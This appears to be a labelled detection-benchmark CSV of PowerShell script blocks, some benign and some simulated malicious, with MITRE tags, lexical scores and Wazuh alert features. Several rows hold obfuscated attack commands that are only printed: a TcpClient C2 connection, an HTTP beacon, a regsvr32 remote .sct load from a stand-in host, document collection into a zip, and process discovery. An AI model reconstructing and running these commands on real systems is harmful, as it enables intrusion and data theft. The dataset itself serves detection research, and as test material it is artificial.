id,label,truth,class_id,dataset_group,scenario,behavior_family,evaluation_group,source_family,tactic,technique,mitre_attack_id,obfuscation_type,safety_class,lexical_input_source,scriptblock_event_id,scriptblock_event_sha256,analysis_text,lexical_score,lexical_reasons,wazuh_prediction,wazuh_alert_count,wazuh_rule_ids,wazuh_rule_levels,wazuh_max_rule_level,wazuh_rule_descriptions,feature_analysis_length,feature_line_count,feature_token_count,feature_special_char_count,feature_special_char_ratio,feature_digit_ratio,feature_whitespace_ratio,feature_entropy,feature_quoted_literal_count,feature_short_literal_count,feature_joined_literal_length,feature_base64_candidate_count,feature_longest_base64_candidate,feature_decoded_view_count,feature_backtick_count,feature_concat_operator_count,feature_join_operator_count,feature_format_operator_count,feature_char_cast_count,feature_suspicious_mixed_case_count,feature_suspicious_mixed_case_tokens,feature_execution_hit_count,feature_execution_hits,feature_raw_execution_hit_count,feature_recovered_execution_hit_count,feature_decoded_execution_hit_count,feature_download_hit_count,feature_download_hits,feature_raw_download_hit_count,feature_recovered_download_hit_count,feature_decoded_download_hit_count,feature_network_c2_hit_count,feature_network_c2_hits,feature_raw_network_c2_hit_count,feature_recovered_network_c2_hit_count,feature_decoded_network_c2_hit_count,feature_defense_evasion_hit_count,feature_defense_evasion_hits,feature_raw_defense_evasion_hit_count,feature_recovered_defense_evasion_hit_count,feature_decoded_defense_evasion_hit_count,feature_persistence_hit_count,feature_persistence_hits,feature_raw_persistence_hit_count,feature_recovered_persistence_hit_count,feature_decoded_persistence_hit_count,feature_credential_access_hit_count,feature_credential_access_hits,feature_raw_credential_access_hit_count,feature_recovered_credential_access_hit_count,feature_decoded_credential_access_hit_count,feature_lolbin_hit_count,feature_lolbin_hits,feature_raw_lolbin_hit_count,feature_recovered_lolbin_hit_count,feature_decoded_lolbin_hit_count,feature_collection_hit_count,feature_collection_hits,feature_raw_collection_hit_count,feature_recovered_collection_hit_count,feature_decoded_collection_hit_count,feature_remote_execution_hit_count,feature_remote_execution_hits,feature_raw_remote_execution_hit_count,feature_recovered_remote_execution_hit_count,feature_decoded_remote_execution_hit_count,feature_discovery_hit_count,feature_discovery_hits,feature_raw_discovery_hit_count,feature_recovered_discovery_hit_count,feature_decoded_discovery_hit_count,feature_indicator_category_count,feature_high_risk_category_count,feature_raw_indicator_hit_count,feature_indicator_hit_count,feature_recovered_indicator_hit_count,feature_decoded_indicator_hit_count,cv_fold,cv_threshold,lexical_prediction,deployment_threshold,lexical_prediction_full_fit,hybrid_or_prediction,hybrid_and_prediction,wazuh_level_3_prediction,wazuh_level_4_prediction,wazuh_level_5_prediction,wazuh_level_7_prediction,wazuh_level_10_prediction,wazuh_level_12_prediction
PST-001,simulated_malicious,1,1,obfuscated_indicator,tcpclient_stream_partial_alias_command_reconstruction,tcpclient_stream_partial,positive:tcpclient_stream_partial,Source-derived inert offensive behavior pattern,Command and Control,Non-Application Layer Protocol,T1095,alias_command_reconstruction,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,777b26ba-ee04-437a-874f-e8e9450b38f9,a23d3b2c0003c31719a253222598d314233d55fa4edc9c25155f82e22803298e,"$parts=@('$client=New-Obj','ect System.Net.','Sockets.TcpC','lient(''203.0.113.','77'',4444); $','stream=$client.Ge','tStream(); ','$buffer=New-Objec','t byte[] 40','96; $read=$strea','m.Read($buffer,','0,$buffer.Length)'); $indicator=[string]::Concat($parts); Write-Output $indicator",9,+2:category_network_c2;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,284,1,31,94,0.330986,0.06338,0.03169,5.112692,12,8,175,0,0,0,0,0,1,0,0,1,Sockets.TcpC,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,2,2,0,2,3,1,5,1,1,0,0,0,0,0,0,0
PST-002,benign,0,0,hard_benign,hard_environment_expansion_v1,hard_environment_expansion,benign:hard_environment_expansion,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,4f5c374f-24f4-4aa7-bc2f-5456705525f8,d05853d63042b65f0e5bafc5c67f260a0c2ac0f8b23dc7681fd0ab0298878313,$template = 'backup_path=%ProgramData%\Company\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template),1,+1:base64_candidate,0,0,,,0,,125,1,9,20,0.16,0.0,0.032,4.934428,1,0,57,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-003,simulated_malicious,1,1,obfuscated_indicator,http_beacon_profile_alias_command_reconstruction,http_beacon_profile,positive:http_beacon_profile,Source-derived inert offensive behavior pattern,Command and Control,Web Protocols,T1071.001,alias_command_reconstruction,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,dd8b2dc8-0fa1-41ea-8dce-e7a513fcb77b,029b75fb615a222f402515c4cccb2f77efe55a052544aa61cfaced86882ddab3,"$parts=@('$profile=','@{Sleep=6','0000;Jitte','r=0.25;Use','rAgent=''Mozil','la/5.0'';Uri=''','/api/v1/status''}','; Invoke-WebR','equest -Uri ''htt','ps://c2.exam','ple.invalid/a','pi/v1/status'''); $indicator=[string]::Concat($parts); Write-Output $indicator",13,+2:category_download;+2:category_network_c2;+2:multiple_high_risk_categories;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,260,1,34,94,0.361538,0.05,0.023077,5.01455,12,12,147,0,0,0,0,0,1,0,0,1,Invoke-WebR,0,,0,0,0,1,invoke-webrequest,0,1,0,1,jitter,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,2,2,0,0,4,1,5,1,1,0,0,0,0,0,0,0
PST-004,simulated_malicious,1,1,obfuscated_indicator,archive_collection_alias_command_reconstruction,archive_collection,positive:archive_collection,Source-derived inert offensive behavior pattern,Collection,Archive Collected Data,T1560.001,alias_command_reconstruction,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,68622779-1caf-4164-abe4-0e23fa361c76,e78d14da6923efd6dbcb542c5bf9f455ca804f557dabfc9d0b62cf47b8a9c969,"$parts=@('Get-ChildIte','m ''$env:USE','RPROFIL','E\Docume','nts'' -','Recurse | Co','mpress-Arch','ive -Dest','inationPa','th ''$','env:TEMP\co','llect.zip',''''); $indicator=[string]::Concat($parts); Write-Output $indicator",9,+1:category_collection;+1:category_discovery;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,225,1,25,76,0.337778,0.0,0.04,4.93609,13,13,111,0,0,0,0,0,1,0,0,1,Get-ChildIte,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,0,2,0,0,,0,0,0,1,get-childitem,0,1,0,2,0,0,3,3,0,3,4,1,5,1,1,0,0,0,0,0,0,0
PST-005,simulated_malicious,1,1,obfuscated_indicator,process_discovery_combined_obfuscation,process_discovery,positive:process_discovery,Source-derived inert offensive behavior pattern,Discovery,Process Discovery,T1057,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,953ef77d-a0f3-4116-ae94-dc9f6de670c0,ef3de9d0b96366183c51492042d4326bc421fc8d4e977d7939c84ebf38a7a92a,"$parts=@('gEt-PrOc','E`Ss',' | S','El`eCt','-oB`J','eCT NAmE,','Id,p','AtH'); $indicator=($parts -join ''); Write-Output $indicator",9,+1:category_discovery;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,131,1,19,48,0.366412,0.0,0.061069,4.847498,9,8,43,0,0,0,3,0,1,0,0,1,gEt-PrOc,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,0,1,0,1,0,0,1,1,0,1,5,1,5,1,1,0,0,0,0,0,0,0
PST-006,benign,0,0,normal_benign,service_inventory_normal_v1,service_inventory_normal,benign:service_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,fde79fe3-5839-4518-8cfc-b38b6ab035a4,fa3fa5f78751f471b3ea673bcb5c05dca73e71223751fa5c6ddeea87a6b75e2b,"Get-Service | Select-Object -First 8 Name, Status",0,,0,0,,,0,,49,1,6,5,0.102041,0.020408,0.122449,4.126226,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-007,benign,0,0,normal_benign,module_list_normal_v2,module_list_normal,benign:module_list_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,8205fa2f-e9fb-4659-a6b0-638e4083a988,e3960b936d3880409e4f4cb2aa952a7b1dd7f58533b95b86073d2cbfaa2546b2,"Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output 'benign variant 2'",0,,0,0,,,0,,97,1,11,10,0.103093,0.020619,0.113402,4.631482,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-008,benign,0,0,normal_benign,hash_string_normal_v2,hash_string_normal,benign:hash_string_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,66069552-91e3-44f8-80ca-82b0a3fa20e4,7b50610d0331ee74b41dd1d4361fd7b754300819778ce4a9c857aac0f04aa19c,"Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,157,1,14,28,0.178344,0.012739,0.063694,5.132935,2,2,22,0,0,0,0,0,0,0,0,1,Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-009,simulated_malicious,1,1,obfuscated_indicator,regsvr32_proxy_execution_backtick_literal,regsvr32_proxy_execution,positive:regsvr32_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Regsvr32,T1218.010,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,fafedcde-d6a2-477f-a45b-7a1cfe464c33,98b2deda87860276a55a3294336a4c78c681afdbde632db42abe8543fabe48d0,$indicator='regs`vr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scro`bj.dll'; Write-Output $indicator,3,+2:category_lolbin;+1:backtick_obfuscation,0,0,,,0,,109,1,14,23,0.211009,0.018349,0.06422,4.734244,1,0,71,0,0,0,2,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,1,5,0,1,0,0,0,0,0,0,0
PST-010,simulated_malicious,1,1,obfuscated_indicator,archive_collection_string_concatenation,archive_collection,positive:archive_collection,Source-derived inert offensive behavior pattern,Collection,Archive Collected Data,T1560.001,string_concatenation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,2643a03f-5ea6-44b8-abc2-5117734d10c3,01d0cdda7a5f8832c33ea6f45089bd1bf17162901b3684313f7ea99b8a7aac9b,$indicator='Get-Child' + 'Item ''$env:USE' + 'RPROFILE' + '\Documents'' -R' + 'ecurse | Co' + 'mpress-Arc' + 'hive -Desti' + 'nationPath ''$e' + 'nv:TEMP\' + 'collect.zip'''; Write-Output $indicator,8,+1:category_collection;+1:category_discovery;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,198,1,20,54,0.272727,0.0,0.131313,4.715514,10,10,111,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,1,1,0,0,,0,0,0,1,get-childitem,0,1,0,2,0,1,3,2,0,3,4,1,5,1,1,0,0,0,0,0,0,0
